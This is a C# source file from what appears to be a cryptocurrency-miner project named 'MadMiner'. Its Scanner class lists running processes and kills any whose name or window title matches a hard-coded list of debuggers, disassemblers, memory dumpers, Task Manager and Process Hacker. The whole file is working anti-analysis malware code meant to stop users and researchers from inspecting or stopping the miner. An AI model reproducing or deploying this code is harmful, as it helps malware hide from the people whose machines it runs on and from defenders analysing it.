using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace MadMiner.Protection
{
    internal class Scanner
    {
        private static readonly HashSet<string> BadProcessnameList = new HashSet<string>();
        private static readonly HashSet<string> BadWindowTextList = new HashSet<string>();

        public static void Run() // Scanner.Run();
        {

            if (Scan(true) != 0)
                Thread.Sleep(100);
        }

        private static int Scan(bool KillProcess)
        {
            var isBadProcess = 0;

            if (BadProcessnameList.Count == 0 && BadWindowTextList.Count == 0) Init();

            var processList = Process.GetProcesses();

            foreach (var process in processList)
                if (BadProcessnameList.Contains(process.ProcessName) ||
                    BadWindowTextList.Contains(process.MainWindowTitle))
                {
                    isBadProcess = 1;

                    if (KillProcess)
                        try
                        {

                            process.Kill();
                        }
                        catch
                        {
                        }

                    break;
                }

            return isBadProcess;
        }

        private static int Init()
        {
            if (BadProcessnameList.Count > 0 && BadWindowTextList.Count > 0) return 1;

            BadProcessnameList.Add("Local");
            BadProcessnameList.Add("AppData");
            BadProcessnameList.Add("Taskmgr");
            BadProcessnameList.Add("ollydbg");
            BadProcessnameList.Add("ida");
            BadProcessnameList.Add("ida64");
            BadProcessnameList.Add("idag");
            BadProcessnameList.Add("idag64");
            BadProcessnameList.Add("idaw");
            BadProcessnameList.Add("idaw64");
            BadProcessnameList.Add("idaq");
            BadProcessnameList.Add("idaq64");
            BadProcessnameList.Add("idau");
            BadProcessnameList.Add("idau64");
            BadProcessnameList.Add("scylla");
            BadProcessnameList.Add("scylla_x64");
            BadProcessnameList.Add("scylla_x86");
            BadProcessnameList.Add("protection_id");
            BadProcessnameList.Add("x64dbg");
            BadProcessnameList.Add("x32dbg");
            BadProcessnameList.Add("windbg");
            BadProcessnameList.Add("reshacker");
            BadProcessnameList.Add("ImportREC");
            BadProcessnameList.Add("IMMUNITYDEBUGGER");
            BadProcessnameList.Add("MegaDumper");
            BadWindowTextList.Add("OLLYDBG");
            BadWindowTextList.Add("ida");
            BadWindowTextList.Add("disassembly");
            BadWindowTextList.Add("scylla");
            BadWindowTextList.Add("Debug");
            BadWindowTextList.Add("[CPU");
            BadWindowTextList.Add("Immunity");
            BadWindowTextList.Add("WinDbg");
            BadWindowTextList.Add("x32dbg");
            BadWindowTextList.Add("x64dbg");
            BadWindowTextList.Add("Import reconstructor");
            BadWindowTextList.Add("MegaDumper");
            BadWindowTextList.Add("MegaDumper 1.0 by CodeCracker / SnD");
            BadWindowTextList.Add("Process Hacker [" + Environment.MachineName + @"\" + Environment.UserName + "]");
            return 0;
        }
    }
}
